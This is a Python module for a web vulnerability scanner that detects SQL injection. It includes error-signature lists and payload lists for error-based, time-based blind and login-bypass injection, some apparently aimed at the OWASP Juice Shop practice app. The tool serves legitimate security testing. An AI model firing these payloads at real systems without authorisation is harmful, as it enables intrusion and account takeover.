"""
mod_sqli.py — SQL Injection detection module.

Covers:
  • Error-based SQLi  (database error strings in response)
  • Blind / Boolean   (HTTP 500 under injection payloads)
  • Time-based Blind  (latency spike after SLEEP/WAITFOR payloads)
"""

import copy
import time
import logging
from typing import Any, Dict, List

import aiohttp

from my_scan.modules.base import BaseModule, CRITICAL, HIGH, MEDIUM, DEFAULT_TIMEOUT

logger = logging.getLogger("mod_sqli")


# ── Detection patterns (inspired by Wapiti mod_sql.py) ──────────────────────

DB_ERROR_SIGNATURES = [
    # MySQL / MariaDB
    "you have an error in your sql syntax",
    "warning: mysql_",
    "mysql_num_rows()",
    "supplied argument is not a valid mysql",
    "mysql server version for the right syntax",
    # PostgreSQL
    "postgresql query failed",
    "pg_query(): query failed",
    "unterminated quoted string at or near",
    "syntax error at or near",
    # Microsoft SQL Server
    "unclosed quotation mark after the character string",
    "incorrect syntax near",
    "mssql_query()",
    "odbc sql server driver",
    # Oracle
    "ora-00933: sql command not properly ended",
    "ora-00907: missing right parenthesis",
    "oracle error",
    # SQLite
    "sqlite3.operationalerror",
    "sqlite_error",
    # H2 / Java
    "org.h2.jdbc.jdbcsqlexception",
    "h2 database exception",
    "jdbc4.mysqldatasource",
    # Generic
    "native client query failed",
    "odbc driver error",
    "db2 exception",
    "mariadb active record error",
    "sql syntax.*mysql",
    "valid mysql result",
    "check the manual that corresponds",
]

# Payloads ordered from least destructive to most informative
ERROR_PAYLOADS = [
    "'",
    "\"",
    "\\",
    "')",
    "''",
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "') OR ('1'='1",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "1' AND 1=2--",
    "1; SELECT 1--",
]

AUTH_BYPASS_PAYLOADS = [
    "' OR 1=1--",
    "' OR '1'='1",
    "admin@juice-sh.op'--",
    "admin'--",
    "' UNION SELECT 1,'a','acc0unt4nt@juice-sh.op','pass','customer','','','','',1,'2020','2020',NULL--",
]

TIME_PAYLOADS = [
    # MySQL / MariaDB
    "1' AND SLEEP(5)-- -",
    "1; WAITFOR DELAY '0:0:5'--",
    # PostgreSQL
    "1'; SELECT pg_sleep(5)--",
    # Generic
    "1 OR SLEEP(5)#",
    "' OR SLEEP(5)='",
]

TIME_THRESHOLD_S = 4.5


class SQLiModule(BaseModule):
    name        = "sqli"
    description = "Detects Error-based, Boolean-based, and Time-based SQL Injection"

    async def run(self, entrypoint: Dict[str, Any]) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        params = self._all_params(entrypoint)

        if not params:
            return findings

        for param_name in params:
            # 1. Error-based testing
            for payload in ERROR_PAYLOADS:
                ep = self._inject_param(entrypoint, param_name, payload)
                resp = await self._send(ep)
                if resp is None:
                    continue
                try:
                    body   = await resp.text()
                    status = resp.status
                finally:
                    resp.release()

                # Check for DB error strings
                body_lower = body.lower()
                matched = next((s for s in DB_ERROR_SIGNATURES if s in body_lower), None)
                if matched:
                    findings.append(self._make_finding(
                        vulnerability="SQL Injection (Error-based)",
                        vuln_id="sqli",
                        severity=HIGH,
                        url=entrypoint["url"],
                        method=entrypoint.get("method", "GET"),
                        parameter=param_name,
                        payload=payload,
                        evidence=f"DB error signature matched: '{matched}'",
                    ))
                    break  # param confirmed — move to next param

                # HTTP 500 is a strong hint
                if status == 500:
                    findings.append(self._make_finding(
                        vulnerability="SQL Injection (Potential)",
                        vuln_id="sqli",
                        severity=MEDIUM,
                        url=entrypoint["url"],
                        method=entrypoint.get("method", "GET"),
                        parameter=param_name,
                        payload=payload,
                        evidence="HTTP 500 returned under SQLi payload",
                    ))
                    break

            # 1.5 Auth bypass testing (specifically for login endpoints)
            if "login" in entrypoint["url"].lower() and param_name in ["email", "username", "user"]:
                for payload in AUTH_BYPASS_PAYLOADS:
                    ep = self._inject_param(entrypoint, param_name, payload)
                    resp = await self._send(ep)
                    if resp is None:
                        continue
                    try:
                        body = await resp.text()
                        status = resp.status
                    finally:
                        resp.release()
                        
                    if status == 200 and ("token" in body.lower() or "authentication" in body.lower()):
                        findings.append(self._make_finding(
                            vulnerability="SQL Injection (Auth Bypass)",
                            vuln_id="sqli_auth_bypass",
                            severity=CRITICAL,
                            url=entrypoint["url"],
                            method=entrypoint.get("method", "GET"),
                            parameter=param_name,
                            payload=payload,
                            evidence="Authentication successful with SQLi payload",
                        ))
                        break

            # 2. Time-based blind testing
            for payload in TIME_PAYLOADS:
                ep = self._inject_param(entrypoint, param_name, payload)
                t0   = time.monotonic()
                resp = await self._send(ep)
                elapsed = time.monotonic() - t0
                if resp is None:
                    continue
                resp.release()

                if elapsed >= TIME_THRESHOLD_S:
                    findings.append(self._make_finding(
                        vulnerability="SQL Injection (Time-based Blind)",
                        vuln_id="sqli_blind",
                        severity=HIGH,
                        url=entrypoint["url"],
                        method=entrypoint.get("method", "GET"),
                        parameter=param_name,
                        payload=payload,
                        evidence=f"Response delayed {elapsed:.2f}s (threshold {TIME_THRESHOLD_S}s)",
                    ))
                    break

        return findings

    # ------------------------------------------------------------------
    def _all_params(self, ep: Dict[str, Any]) -> List[str]:
        """Collect parameter names from query params and body."""
        names: List[str] = []
        if ep.get("params"):
            names += list(ep["params"].keys())
        body = ep.get("body", "") or ""
        if body:
            import json as _json
            from urllib.parse import parse_qs as _pqs
            try:
                bd = _json.loads(body)
                if isinstance(bd, dict):
                    names += [k for k in bd if k not in names]
            except Exception:
                pass
            try:
                for k in _pqs(body):
                    if k not in names:
                        names.append(k)
            except Exception:
                pass
        return names
